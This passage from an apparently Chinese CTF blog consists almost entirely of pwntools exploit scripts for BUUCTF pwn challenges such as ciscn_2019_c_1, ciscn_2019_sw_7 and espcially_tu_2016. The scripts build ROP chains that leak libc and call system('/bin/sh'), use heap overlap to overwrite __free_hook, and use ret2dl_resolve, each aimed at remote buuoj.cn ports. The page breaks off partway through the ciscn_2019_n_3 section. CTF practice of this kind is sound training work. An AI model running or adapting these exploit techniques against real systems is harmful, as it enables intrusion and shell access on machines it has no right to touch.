class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_c_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_c_1")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	sh.recvuntil("Input your choice!")</span><br><span class="line">	pop3_ret = 0x0000000000400c7f</span><br><span class="line">	pop_rdi_ret = 0x0000000000400c83</span><br><span class="line">	pop_rsi_r15_ret = 0x0000000000400c81</span><br><span class="line">	payload  = '\x00' * (0x50 + 0x8)</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input your Plaintext to be encrypted\n")</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil("Ciphertext\n\n")</span><br><span class="line">	libc = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc+ lib.search("/bin/sh\x00").next()</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input your Plaintext to be encrypted\n")</span><br><span class="line">	payload  = "\x00" * (0x50 + 0x8)</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20115,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x15-ciscn-2019-n-1"><a href="#0x15-ciscn-2019-n-1" class="headerlink" title="0x15 ciscn_2019_n_1"></a>0x15 ciscn_2019_n_1</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_n_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_n_1")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop_rdi_ret = 0x400793</span><br><span class="line">	offset = 56</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt['gets'])</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(elf.bss()) + p64(elf.plt['system'])</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("/bin/sh\x00")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20137,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x16-ciscn-2019-n-8"><a href="#0x16-ciscn-2019-n-8" class="headerlink" title="0x16 ciscn_2019_n_8"></a>0x16 ciscn_2019_n_8</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_n_8")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_n_8")</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	sh.recv()</span><br><span class="line">	payload = "\x11" * 0x35</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20144,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x17-ciscn-2019-sw-7"><a href="#0x17-ciscn-2019-sw-7" class="headerlink" title="0x17 ciscn_2019_sw_7"></a>0x17 ciscn_2019_sw_7</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_7")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(">")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("The size of note:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("The content of note:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(">")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(">")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add_str(size,content):</span><br><span class="line">        sh.recvuntil(">")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("The size of note:")</span><br><span class="line">        sh.sendline(size)</span><br><span class="line">        sh.recvuntil("The content of note:")</span><br><span class="line">        sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_sw_7")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">		main_arena_offset = 0x7fc161d75b20 - 0x7fc1619b1000</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">		main_arena_offset = 0x3C4B20</span><br><span class="line">	add(0x10,"\x11" * 0xF + "\n")</span><br><span class="line">	add(0x10,"\x22" * 0xF + "\n")</span><br><span class="line">	add(0x60,"\x33" * 0xF + "\n")</span><br><span class="line">	add(0x60,"\x77" * 0x5F + "\n")</span><br><span class="line">	add(0x10,"\x44" * 0xF + "\n")</span><br><span class="line">	free(0)</span><br><span class="line">	payload  = p64(0) * 2</span><br><span class="line">	payload += p64(0x91) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(0x60)</span><br><span class="line">	add_str("-1",payload + "\n")</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x10,"\x55" * 0xF + "\n")</span><br><span class="line">	show(2)</span><br><span class="line">	sh.recvuntil("2 : ")</span><br><span class="line">	main_arena = u64(sh.recvuntil("\x7f").ljust(8,"\x00")) - 88</span><br><span class="line">	libc = main_arena - main_arena_offset</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	__free_hook = libc + 0x3C67A8</span><br><span class="line">	free(0)</span><br><span class="line">	payload = p64(0) * 2 + p64(0x21) + p64(0x10) + p64(0) * 2 + p64(0x71) + p64(main_arena + 88) + p64(__free_hook - 0x40) + "\n"</span><br><span class="line">	add_str("-1",payload)</span><br><span class="line">	add(0x60,"\x66" * 0x5F + "\n")</span><br><span class="line">	free(0)</span><br><span class="line">	free(3)</span><br><span class="line">	payload  = p64(0)*2 + p64(0x21) + p64(0x10) + p64(0)*2 + p64(0x71) + p64(0x60) + p64(0) * 12 + p64(0x71) + p64(__free_hook - 0x33)</span><br><span class="line">	payload += p64(0) * 12 + p64(0x21) + "/bin/sh\x00\n"</span><br><span class="line">	add_str("-1",payload)</span><br><span class="line">	add(0x60,"aaaa\n")</span><br><span class="line">	payload = '\x7f\x00\x00' + p64(0) * 3 + p64(system) + "\n"</span><br><span class="line">	add(0x60,payload)</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	#input()</span><br><span class="line">	free(4)</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	#x/50gx (long long)(&main_arena)</span><br><span class="line">	#x/50gx (long long)(&__free_hook) - 0x50</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20134,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x18-espcially-tu-2016"><a href="#0x18-espcially-tu-2016" class="headerlink" title="0x18 espcially_tu_2016"></a>0x18 espcially_tu_2016</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一:"></a>解法一:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("espcially_tu_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./espcially_tu_2016")</span><br><span class="line">		lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">	pop_ebp_ret = 0x0804864f</span><br><span class="line">	pop_ebx_esi_edi_ebp_ret = 0x0804864C</span><br><span class="line">	pop3_ret = 0x0804864d</span><br><span class="line">	gets_plt = 0x080483D0</span><br><span class="line">	offset = 44</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p32(elf.plt['puts']) + p32(pop_ebp_ret) + p32(elf.got['__libc_start_main'])</span><br><span class="line">	payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got["printf"])</span><br><span class="line">	payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.got['printf'])</span><br><span class="line">	payload += p32(gets_plt) + p32(pop_ebp_ret) + p32(elf.bss())</span><br><span class="line">	payload += p32(elf.plt['printf']) + p32(0xdeadbeef) + p32(elf.bss())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("number!\n")</span><br><span class="line">	__libc_start_main = u32(sh.recv(4))</span><br><span class="line">	libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(p32(system))</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline("/bin/sh\x00")</span><br><span class="line">	payload  = offset * "a"</span><br><span class="line">	payload += p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	#sh.sendline(payload)</span><br><span class="line">	#sh.recv()</span><br><span class="line">	#sh.sendline("1")</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20071,1)</span><br></pre></td></tr></tbody></table></figure></div>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二:"></a>解法二:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from time import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r = process('./espcially_tu_2016')</span><br><span class="line">r = remote("buuoj.cn",20071)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"></span><br><span class="line">rop = ROP('./espcially_tu_2016')</span><br><span class="line">offset = 44</span><br><span class="line">bss_base = rop.section('.bss') + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call('gets', bss_base)</span><br><span class="line">buf += rop.call('gets', bss_base)</span><br><span class="line"># used to call dl_Resolve()</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline("1")</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line"># used to make faking data, such relocation, Symbol, Str</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.sendline(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x19-ciscn-2019-en-2"><a href="#0x19-ciscn-2019-en-2" class="headerlink" title="0x19 ciscn_2019_en_2"></a>0x19 ciscn_2019_en_2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_en_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_2019_en_2")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">	sh.recvuntil("Input your choice!")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input your Plaintext to be encrypted")</span><br><span class="line">	payload  = "a\x00"</span><br><span class="line">	offset = 88</span><br><span class="line">	pop_rdi_ret = 0x400c83</span><br><span class="line">	payload  = "a" * offset</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(elf.got['__libc_start_main']) + p64(elf.plt['puts'])</span><br><span class="line">	payload += p64(elf.symbols['_start'])</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	libc = u64(sh.recvuntil("\x7f\x0a",)[-7:].ljust(8,"\x00")) % 0x1000000000000 - lib.symbols['__libc_start_main']</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">	</span><br><span class="line">        sh.recvuntil("Input your choice!")</span><br><span class="line">        sh.sendline("1")</span><br><span class="line">        sh.recvuntil("Input your Plaintext to be encrypted")</span><br><span class="line">        payload  = "a\x00"</span><br><span class="line">        offset = 88</span><br><span class="line">        payload  = "a" * offset</span><br><span class="line">        payload += p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">        sh.sendline(payload)	</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	log.success("system: " + hex(system))</span><br><span class="line">	log.success("binsh: " + hex(binsh))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20123,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x20-ciscn-s-4"><a href="#0x20-ciscn-s-4" class="headerlink" title="0x20 ciscn_s_4"></a>0x20 ciscn_s_4</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("ciscn_s_4")</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./ciscn_s_4")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">	pop3_ret = 0x08048699</span><br><span class="line">	pop2_ret = 0x0804869a</span><br><span class="line">	offset = 44</span><br><span class="line">	main_addr = 0x080485FF</span><br><span class="line">	payload = (offset-12) * 'a' + p32(0x0804A01C) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	payload = (offset-0x10) * "b"+"5"*4 +p32(0x0804A01C)+"7"*4+"8"*4 +p32(0x0804861D)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.recv(33-4-4)</span><br><span class="line">	libc = u32(sh.recv(4)) - lib.symbols["__libc_start_main"]</span><br><span class="line">	log.success("libc :" + hex(libc))</span><br><span class="line">	system = 0x08048559</span><br><span class="line">	binsh = libc + next(lib.search("/bin/sh"))</span><br><span class="line">	log.success("binsh :"+hex(binsh))</span><br><span class="line">	log.success("system :"+hex(libc + lib.symbols['system']))</span><br><span class="line">	#input()</span><br><span class="line">	payload = (offset)*"a" + p32(0x08048450)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload = (offset-12) * 'a' + p32(binsh) + "2"*4 + "3"*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil("Hello, ")</span><br><span class="line">	payload = (offset-0x10) * "b"+"5"*4 +p32(binsh)+"7"*4+"8"*4 +p32(system)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	#sh.recvuntil("Hello, ")</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("buuoj.cn",20155,0)</span><br></pre></td></tr></tbody></table></figure></div>

<h2 id="0x21-ciscn-2019-n-3"><a href="#0x21-ciscn-2019-n-3" class="headerlink" title="0x21 ciscn_2019_n_3"></a>0x21 ciscn_2019_n_3</h2><h2 id="1、利用unsorted-bin-attack知道libc地址"><a href="#1、利用unsorted-bin-attack知道libc地址" class="headerlink" title="1、利用unsorted bin attack知道libc地址"></a>1、利用unsorted bin attack知道libc地址</h2><h2 id="2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"><a href="#2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串" class="headerlink" title="2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"></a>2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 